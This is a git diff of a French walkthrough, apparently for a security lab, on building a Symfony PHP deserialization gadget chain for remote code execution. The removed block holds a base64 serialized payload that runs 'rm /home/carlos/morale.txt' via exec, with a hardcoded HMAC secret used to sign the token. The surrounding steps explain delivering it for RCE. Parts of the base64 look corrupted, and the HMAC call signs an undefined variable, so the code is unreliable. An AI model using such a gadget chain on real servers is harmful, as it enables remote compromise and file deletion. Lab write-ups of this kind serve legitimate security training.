@@ -44,18 +44,7 @@
 - J'ai plus qu'à générer la payload en ajoutant la commande de supprésion de fichier tout en implémentant la payload en base64.<br/><br/>
 <img src="https://media.discordapp.net/attachments/768928242467340328/770319551245582336/unknown.png"/><br/><br/>
 - Pour que le résultat soit en une ligne faites "base64 -w 0".<br/><br/>
-```PHP
-<?php 
-	$rce =
-"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6TI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhYhlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
-
-	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
-	
-	echo $payload = urlencode('{"token":"' . $rce . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
-
-?>
-```
-<br/>
+<img src="https://media.discordapp.net/attachments/769291075205464104/770340356490919956/unknown.png?width=1440&height=244"/><br/><br/>
 - Notre gadget chain est enfin terminé, maintenant on fait exécuter le fichier .php, qu'importe le serveur, personnellement je l'héberge dans mon réseau local.<br/><br/>
 <img src="https://media.discordapp.net/attachments/768928242467340328/770322237214818304/unknown.png?width=1440&height=394"/><br/><br/>
 - Hop, on a notre gadget chain. Pour la mettre en oeuvre on a plus qu'à C/C notre payload dans l'index qu'on a redirigé vers le repeater et on a notre RCE ;].<br/><br/>
